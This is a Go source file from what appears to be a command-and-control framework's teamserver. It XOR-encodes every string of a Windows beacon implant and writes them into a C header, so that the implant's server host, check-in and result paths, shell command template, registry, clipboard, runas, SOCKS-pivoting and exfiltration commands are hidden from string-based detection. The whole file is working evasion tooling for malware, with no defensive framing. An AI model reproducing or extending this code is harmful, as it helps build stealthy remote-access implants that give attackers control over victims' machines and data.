// teamserver/obfgen/obfgen.go
package obfgen

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unicode/utf16"
)

const KeyLen = 8

var xorKey = [KeyLen]byte{0xA3, 0x7F, 0x2C, 0x91, 0xB4, 0x5E, 0xD8, 0x06}

// Key returns a copy of the XOR key (for tests).
func Key() [KeyLen]byte { return xorKey }

type entry struct {
	name   string
	plain  string
	isWide bool
}

var baseEntries = []entry{
	{"SERVER_HOST",      "",                                                         false},
	{"USER_AGENT",       "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",               true},
	{"PATH_PUBKEY",      "/api/pubkey",                                              false},
	{"PATH_REGISTER",    "/api/register",                                            false},
	{"PATH_CHECKIN",     "/api/checkin",                                             false},
	{"PATH_RESULT",      "/api/result",                                              false},
	{"CONTENT_TYPE",     "Content-Type: application/octet-stream",                  true},
	{"SHELL_PREFIX",     "shell ",                                                   false},
	{"CMD_WHOAMI",       "whoami",                                                   false},
	{"CMD_HOSTNAME",     "hostname",                                                 false},
	{"CMD_DOMAIN",       "domain",                                                   false},
	{"CMD_GETPID",       "getpid",                                                   false},
	{"CMD_GETINTEGRITY", "getintegrity",                                             false},
	{"CMD_SYSINFO",      "sysinfo",                                                  false},
	{"CMD_DRIVES",       "drives",                                                   false},
	{"CMD_ENV",          "env",                                                      false},
	{"CMD_GETENV",       "getenv ",                                                  false},
	{"CMD_PWD",          "pwd",                                                      false},
	{"CMD_CD",           "cd",                                                       false},
	{"CMD_CD_SP",        "cd ",                                                      false},
	{"CMD_LS",           "ls",                                                       false},
	{"CMD_LS_SP",        "ls ",                                                      false},
	{"CMD_DIR",          "dir",                                                      false},
	{"CMD_DIR_SP",       "dir ",                                                     false},
	{"CMD_CAT",          "cat ",                                                     false},
	{"CMD_STAT",         "stat ",                                                    false},
	{"CMD_MKDIR",        "mkdir ",                                                   false},
	{"CMD_RM",           "rm ",                                                      false},
	{"CMD_RMDIR",        "rmdir ",                                                   false},
	{"CMD_CP",           "cp ",                                                      false},
	{"CMD_MV",           "mv ",                                                      false},
	{"CMD_PS",           "ps",                                                       false},
	{"CMD_KILL",         "kill ",                                                    false},
	{"CMD_IPCONFIG",     "ipconfig",                                                 false},
	{"CMD_ARP",          "arp",                                                      false},
	{"CMD_NETSTAT",      "netstat",                                                  false},
	{"CMD_DNS",          "dns ",                                                     false},
	{"CMD_PRIVS",        "privs",                                                    false},
	{"CMD_GROUPS",       "groups",                                                   false},
	{"CMD_SERVICES",     "services",                                                 false},
	{"CMD_UPTIME",       "uptime",                                                   false},
	{"CMD_REG_QUERY",    "reg_query ",                                               false},
	{"CMD_REG_SET",      "reg_set ",                                                 false},
	{"CMD_CLIPBOARD",    "clipboard",                                                false},
	{"CMD_RUNAS",        "runas ",                                                   false},
	{"HTTP_POST",        "POST",                                                     false},
	{"HTTP_GET",         "GET",                                                      false},
	{"EXEC_SHELL_TMPL",  "cmd.exe /c %s",                                           false},
	{"REG_HIVE_HKLM",    "HKLM\\",                                                  false},
	{"REG_HIVE_HKCU",    "HKCU\\",                                                  false},
	{"REG_HIVE_HKCR",    "HKCR\\",                                                  false},
	{"REG_HIVE_HKU",     "HKU\\",                                                   false},

	/* DLL names for LoadLibraryA in dynapi.c */
	{"DLL_KERNEL32",     "kernel32.dll",                                            true},
	{"DLL_KERNEL32_A",   "kernel32.dll",                                            false},
	{"DLL_WINHTTP",      "winhttp.dll",                                             false},
	{"DLL_BCRYPT",       "bcrypt.dll",                                               false},
	{"DLL_CRYPT32",      "crypt32.dll",                                              false},
	{"DLL_ADVAPI32",     "advapi32.dll",                                             false},
	{"DLL_USER32",       "user32.dll",                                               false},
	{"DLL_IPHLPAPI",     "iphlpapi.dll",                                             false},
	{"DLL_DNSAPI",       "dnsapi.dll",                                               false},
	{"DLL_NETAPI32",     "netapi32.dll",                                             false},
	{"DLL_WS2_32",       "ws2_32.dll",                                              false},

	/* ls */
	{"LS_ERR_ACCESS",    "ls: cannot access '%s' (error %lu)\r\n",                  false},
	{"LS_TAG_DIR",       "<DIR>  ",                                                  false},
	{"LS_TAG_FILE",      "       ",                                                  false},

	/* ps */
	{"PS_ERR_SNAP",      "ps: snapshot failed (error %lu)\r\n",                     false},
	{"PS_HDR_FMT",       "%-8s  %-30s  %s\r\n%-8s  %-30s  %s\r\n",                 false},
	{"PS_HDR_PID",       "PID",                                                      false},
	{"PS_HDR_NAME",      "Name",                                                     false},
	{"PS_HDR_PPID",      "Parent PID",                                               false},
	{"PS_HDR_DIV1",      "--------",                                                 false},
	{"PS_HDR_DIV2",      "----",                                                     false},
	{"PS_HDR_DIV3",      "----------",                                               false},
	{"PS_ROW_FMT",       "%-8lu  %-30s  %lu\r\n",                                   false},

	/* cat */
	{"CAT_ERR_MISSING",  "cat: missing file path\r\n",                               false},
	{"CAT_ERR_OPEN",     "cat: cannot open '%s' (error %lu)\r\n",                    false},

	/* stat */
	{"STAT_ERR_MISSING", "stat: missing path\r\n",                                   false},
	{"STAT_ERR_NOTFOUND","stat: '%s' not found (error %lu)\r\n",                     false},
	{"STAT_TYPE_DIR",    "Directory",                                                 false},
	{"STAT_TYPE_FILE",   "File",                                                      false},
	{"STAT_FMT",         "Path:     %s\r\nType:     %s\r\nSize:     %lld bytes\r\nCreated:  %04u-%02u-%02u %02u:%02u:%02u UTC\r\nModified: %04u-%02u-%02u %02u:%02u:%02u UTC\r\nAccessed: %04u-%02u-%02u %02u:%02u:%02u UTC\r\n", false},

	/* cd */
	{"CD_ERR_CHDIR",     "cd: cannot change to '%s' (error %lu)\r\n",               false},

	/* sysinfo */
	{"SYSINFO_REGKEY",           "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",  false},
	{"SYSINFO_REGVAL_PRODUCT",   "ProductName",                                      false},
	{"SYSINFO_REGVAL_BUILD",     "CurrentBuildNumber",                               false},
	{"SYSINFO_PRODUCT_DEFAULT",  "Unknown",                                          false},
	{"SYSINFO_ARCH_X64",         "x64",                                              false},
	{"SYSINFO_ARCH_X86",         "x86",                                              false},
	{"SYSINFO_ARCH_UNK",         "unknown",                                          false},
	{"SYSINFO_FMT",              "OS:       %s (Build %s)\r\nArch:     %s\r\nRAM:      %lu MB total / %lu MB free\r\nHostname: %s\r\nUser:     %s\r\n", false},

	/* drives */
	{"DRIVES_ERR",       "drives: error %lu\r\n",                                    false},
	{"DRIVES_FIXED",     "Fixed",                                                     false},
	{"DRIVES_REMOVABLE", "Removable",                                                 false},
	{"DRIVES_NETWORK",   "Network",                                                   false},
	{"DRIVES_CDROM",     "CD-ROM",                                                    false},
	{"DRIVES_RAM",       "RAM",                                                       false},
	{"DRIVES_UNKNOWN",   "Unknown",                                                   false},
	{"DRIVES_SPACE_FMT", "  %lu GB total / %lu GB free",                             false},
	{"DRIVES_ROW_FMT",   "%s  %-10s%s\r\n",                                          false},

	/* getintegrity */
	{"INTEG_ERR",        "getintegrity: error %lu\r\n",                              false},
	{"INTEG_ERR_ALLOC",  "getintegrity: alloc failed\r\n",                           false},
	{"INTEG_SYSTEM",     "System",                                                    false},
	{"INTEG_HIGH",       "High",                                                      false},
	{"INTEG_MEDIUM",     "Medium",                                                    false},
	{"INTEG_LOW",        "Low",                                                       false},
	{"INTEG_FMT",        "%s (RID: 0x%lX)\r\n",                                     false},

	/* ipconfig */
	{"IPCONFIG_ERR",     "ipconfig: error %lu\r\n",                                  false},
	{"IPCONFIG_ADAPTER", "\r\n[%s]\r\n",                                             false},
	{"IPCONFIG_IPV4",    "  IPv4: %u.%u.%u.%u\r\n",                                 false},
	{"IPCONFIG_IPV6",    "  IPv6: %02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x\r\n", false},

	/* arp */
	{"ARP_ERR",          "arp: failed\r\n",                                          false},
	{"ARP_HDR_FMT",      "%-16s  %-20s  %s\r\n%-16s  %-20s  %s\r\n",               false},
	{"ARP_HDR_IP",       "IP Address",                                               false},
	{"ARP_HDR_MAC",      "MAC Address",                                              false},
	{"ARP_HDR_TYPE",     "Type",                                                     false},
	{"ARP_HDR_DIV1",     "----------",                                               false},
	{"ARP_HDR_DIV2",     "-----------",                                              false},
	{"ARP_HDR_DIV3",     "----",                                                     false},
	{"ARP_DYNAMIC",      "Dynamic",                                                   false},
	{"ARP_STATIC",       "Static",                                                    false},
	{"ARP_OTHER",        "Other",                                                     false},
	{"ARP_INVALID",      "Invalid",                                                   false},
	{"ARP_ROW_FMT",      "%-16s  %-20s  %s\r\n",                                    false},

	/* tcp states */
	{"TCP_STATE_LISTEN",      "LISTEN",                                               false},
	{"TCP_STATE_SYN_SENT",    "SYN_SENT",                                             false},
	{"TCP_STATE_SYN_RCVD",    "SYN_RCVD",                                             false},
	{"TCP_STATE_ESTABLISHED", "ESTABLISHED",                                          false},
	{"TCP_STATE_FIN_WAIT1",   "FIN_WAIT1",                                            false},
	{"TCP_STATE_FIN_WAIT2",   "FIN_WAIT2",                                            false},
	{"TCP_STATE_CLOSE_WAIT",  "CLOSE_WAIT",                                           false},
	{"TCP_STATE_CLOSING",     "CLOSING",                                              false},
	{"TCP_STATE_LAST_ACK",    "LAST_ACK",                                             false},
	{"TCP_STATE_TIME_WAIT",   "TIME_WAIT",                                            false},
	{"TCP_STATE_UNKNOWN",     "UNKNOWN",                                              false},

	/* netstat */
	{"NETSTAT_HDR_FMT",   "Proto  %-20s %-20s %-14s PID\r\n",                       false},
	{"NETSTAT_HDR_LOCAL", "Local",                                                    false},
	{"NETSTAT_HDR_REMOTE","Remote",                                                   false},
	{"NETSTAT_HDR_STATE", "State",                                                    false},
	{"NETSTAT_TCP_FMT",   "TCP    %-20s %-20s %-14s %lu\r\n",                        false},
	{"NETSTAT_UDP_FMT",   "UDP    %-20s %-20s\r\n",                                  false},
	{"NETSTAT_UDP_STAR",  "*:*",                                                      false},

	/* dns */
	{"DNS_ERR_MISSING",   "dns: missing name\r\n",                                   false},
	{"DNS_ERR_QUERY",     "dns: query failed (error %ld)\r\n",                        false},
	{"DNS_AREC_FMT",      "  A    %u.%u.%u.%u\r\n",                                 false},
	{"DNS_NO_RECORDS",    "dns: no A records\r\n",                                    false},

	/* privs */
	{"PRIVS_ERR",          "privs: error %lu\r\n",                                   false},
	{"PRIVS_ERR_ALLOC",    "privs: alloc failed\r\n",                                false},
	{"PRIVS_ERR_GETTOKEN", "privs: GetTokenInformation failed (error %lu)\r\n",      false},
	{"PRIVS_ENABLED_DEF",  "[Enabled+Default]",                                      false},
	{"PRIVS_ENABLED",      "[Enabled]",                                              false},
	{"PRIVS_DEFAULT",      "[Default]",                                              false},
	{"PRIVS_DISABLED",     "[Disabled]",                                             false},
	{"PRIVS_ROW_FMT",      "  %-40s %s\r\n",                                        false},

	/* groups */
	{"GROUPS_ERR_USERNAME","groups: GetUserNameA failed (error %lu)\r\n",            false},
	{"GROUPS_ERR_NETAPI",  "groups: NetUserGetLocalGroups failed (error %lu)\r\n",   false},
	{"GROUPS_ROW_FMT",     "  %s\r\n",                                               false},

	/* services */
	{"SERVICES_ERR_SCM",  "services: OpenSCManager failed (error %lu)\r\n",          false},
	{"SERVICES_ERR_ALLOC","services: alloc failed\r\n",                              false},
	{"SERVICES_RUNNING",  "RUNNING",                                                  false},
	{"SERVICES_STOPPED",  "STOPPED",                                                  false},
	{"SERVICES_OTHER_ST", "OTHER",                                                    false},
	{"SERVICES_ROW_FMT",  "  %-40s  %-8s  PID %lu\r\n",                             false},

	/* reg_query errors */
	{"REG_QUERY_ERR_HIVE",     "reg_query: unknown hive\r\n",                        false},
	{"REG_QUERY_ERR_OPEN",     "reg_query: cannot open key (error %lu)\r\n",         false},
	{"REG_QUERY_ERR_NOTFOUND", "reg_query: value not found (error %ld)\r\n",         false},

	/* reg_set errors */
	{"REG_SET_ERR_HIVE",  "reg_set: unknown hive\r\n",                               false},
	{"REG_SET_ERR_OPEN",  "reg_set: cannot open key (error %lu)\r\n",                false},
	{"REG_SET_ERR_FAIL",  "reg_set: failed (error %ld)\r\n",                         false},
	{"REG_SET_OK",        "reg_set: OK\r\n",                                         false},

	/* clipboard */
	{"CLIPBOARD_ERR_OPEN","clipboard: OpenClipboard failed (error %lu)\r\n",         false},
	{"CLIPBOARD_EMPTY",   "(clipboard is empty)\r\n",                                 false},
	{"CLIPBOARD_ERR_LOCK","clipboard: GlobalLock failed\r\n",                        false},

	/* runas */
	{"RUNAS_ERR_FAIL",    "runas: failed (error %lu)\r\n",                           false},

	/* uptime */
	{"UPTIME_FMT",        "%llu days, %llu hours, %llu minutes, %llu seconds\r\n",  false},

	/* dispatcher inline */
	{"WHOAMI_ERR",        "whoami: error %lu\r\n",                                   false},
	{"HOSTNAME_ERR",      "hostname: error %lu\r\n",                                 false},
	{"DOMAIN_NOT_JOINED", "(not domain-joined)\r\n",                                 false},
	{"GETENV_ERR",        "getenv: '%s' not found\r\n",                              false},
	{"PWD_ERR",           "pwd: error %lu\r\n",                                      false},
	{"MKDIR_ERR",         "mkdir: failed (error %lu)\r\n",                           false},
	{"RMDIR_ERR",         "rmdir: failed (error %lu)\r\n",                           false},
	{"RM_ERR",            "rm: failed (error %lu)\r\n",                              false},
	{"CP_ERR",            "cp: failed (error %lu)\r\n",                              false},
	{"MV_ERR",            "mv: failed (error %lu)\r\n",                              false},
	{"KILL_ERR_OPEN",     "kill: cannot open PID %lu (error %lu)\r\n",               false},

	/* getpid */
	{"GETPID_FMT",        "%lu\r\n",                                                 false},

	/* exec */
	{"SHELL_ERR_LONG",    "shell: command too long\r\n",                             false},

	/* ls row format */
	{"LS_ROW_FMT",        "%s%s\r\n",                                                false},

	/* arp address formats */
	{"ARP_IP_FMT",        "%u.%u.%u.%u",                                            false},
	{"ARP_MAC_FMT",       "%02X-%02X-%02X-%02X-%02X-%02X",                          false},

	/* netstat address format */
	{"NETSTAT_ADDR_FMT",  "%u.%u.%u.%u:%u",                                         false},

	/* reg_query value formats */
	{"REG_FMT_SZ",        "%s\r\n",                                                  false},
	{"REG_FMT_DWORD",     "0x%08lX (%lu)\r\n",                                      false},
	{"REG_FMT_HEX",       "%02X ",                                                   false},

	/* transfer */
	{"EXFIL_ERR_OPEN",     "exfil: open failed (0x%08lx)\r\n",                      false},
	{"EXFIL_ERR_READ",     "exfil: read failed (0x%08lx)\r\n",                      false},

	// SOCKS5 pivoting
	{"SOCKS_CONNECT_FAIL", "socks: connect failed", false},
	{"SOCKS_RESOLVE_FAIL", "socks: resolve failed", false},
	{"SOCKS_SLOTS_FULL",   "socks: no free channels", false},

	/* crypto labels */
	{"CRYPTO_AES_CBC",     "aes-cbc",          false},
	{"CRYPTO_HMAC_SHA256", "hmac-sha256",       false},

	/* exec / runas */
	{"FMT_PID_EXIT",       "pid=%lu exit=%lu",  false},

	/* ls pattern strings */
	{"DIR_WILDCARD",        ".\\*",             false},
	{"DIR_FMT_STAR",        "%s*",              false},
	{"DIR_FMT_BSLASH_STAR", "%s\\*",            false},

	/* ls dot-skip strings */
	{"DOT",    ".",   false},
	{"DOTDOT", "..", false},

	/* DLL extension for forward-export resolution */
	{"DLL_EXT", ".dll", false},
}

// EncodeNarrow XOR-encodes a narrow (ASCII/UTF-8) string.
func EncodeNarrow(plain string) []byte {
	b := []byte(plain)
	out := make([]byte, len(b))
	for i, c := range b {
		out[i] = c ^ xorKey[i%KeyLen]
	}
	return out
}

// DecodeNarrow reverses EncodeNarrow (XOR is its own inverse).
func DecodeNarrow(enc []byte) string {
	return string(EncodeNarrow(string(enc)))
}

// EncodeWide XOR-encodes a string as UTF-16LE bytes.
// Returns encoded bytes and the wchar_t count (not byte count).
func EncodeWide(plain string) ([]byte, int) {
	u16 := utf16.Encode([]rune(plain))
	buf := make([]byte, len(u16)*2)
	for i, w := range u16 {
		buf[2*i]   = byte(w&0xFF) ^ xorKey[(2*i)%KeyLen]
		buf[2*i+1] = byte(w>>8)   ^ xorKey[(2*i+1)%KeyLen]
	}
	return buf, len(u16)
}

// DecodeWide reverses EncodeWide.
func DecodeWide(enc []byte, wlen int) string {
	u16 := make([]uint16, wlen)
	for i := range u16 {
		lo := enc[2*i]   ^ xorKey[(2*i)%KeyLen]
		hi := enc[2*i+1] ^ xorKey[(2*i+1)%KeyLen]
		u16[i] = uint16(lo) | uint16(hi)<<8
	}
	return string(utf16.Decode(u16))
}

// Generate writes beacon/include/obf_strings.h to outDir.
// host is substituted for the SERVER_HOST entry.
func Generate(host, outDir string) error {
	if host == "" {
		return fmt.Errorf("obfgen.Generate: host must not be empty")
	}
	var sb strings.Builder
	sb.WriteString("/* AUTO-GENERATED by gen_obf — DO NOT EDIT */\n#pragma once\n\n")

	for _, e := range baseEntries {
		plain := e.plain
		if e.name == "SERVER_HOST" {
			plain = host
		}

		var enc []byte
		var length int
		if e.isWide {
			enc, length = EncodeWide(plain)
			fmt.Fprintf(&sb, "/* %s (wide): L\"%s\" */\n", e.name, plain)
		} else {
			enc = EncodeNarrow(plain)
			length = len(plain)
			fmt.Fprintf(&sb, "/* %s: \"%s\" */\n", e.name, plain)
		}

		fmt.Fprintf(&sb, "static const unsigned char ENC_%s[] = {", e.name)
		for i, b := range enc {
			if i > 0 {
				sb.WriteByte(',')
			}
			fmt.Fprintf(&sb, " 0x%02X", b)
		}
		sb.WriteString(" };\n")
		fmt.Fprintf(&sb, "#define ENC_%s_LEN %d\n\n", e.name, length)
	}

	return os.WriteFile(filepath.Join(outDir, "obf_strings.h"), []byte(sb.String()), 0644)
}
